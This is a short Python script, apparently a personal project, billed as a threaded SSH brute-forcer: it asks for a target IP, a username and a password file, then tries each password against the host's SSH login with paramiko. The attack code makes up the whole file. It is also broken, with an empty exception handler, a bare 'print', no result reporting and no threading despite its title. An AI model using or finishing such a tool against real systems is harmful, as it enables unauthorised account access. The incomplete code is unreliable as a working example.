# Importing Libraries 
# 1. Paramiko - To automate the process of ssh connection
# 2. Termcolor - For Terminal color
import termcolor, sys, os, paramiko, socket

print("------------| PROJECT - 2 | THREADED SSH BRUTEFORCER | BY TANISH CHOUDHARY |------------")

# INPUT REQUIRED CREDS
host = input("[-|-] ENTER IP [-|-] :  ") # Target Address
username = input("[-|-] SSH USERNAME [-|-] : ") # SSH Username
input_file = input("[-|-] PASSWORD FILE [-|-] : ") # Passwords File

# FILE PATH VERIFICATION
if  os.path.exists(input_file) == False:
    print("[-|-] FILE/PATH WRONG OR NOT EXIST") # Checks if the file path's exists or not
    sys.exit(1)

# SSH BRUTEFORCE
def ssh_connect(password, code=0): # Code 0 means to set var code to 0 if 2nd var in function is not passed  
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # Connecting SSH
    try:
        ssh.connect(host, port=22, username=username, password=password)
    # This type of exception handles when password is incorrect
    except paramiko.AuthenticationException: 
        
        
# READING AND COMPARING PASSWORD
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip() # Seperating Passwords from lines
        try:
            ssh_connect(password)
        except:
            print
            
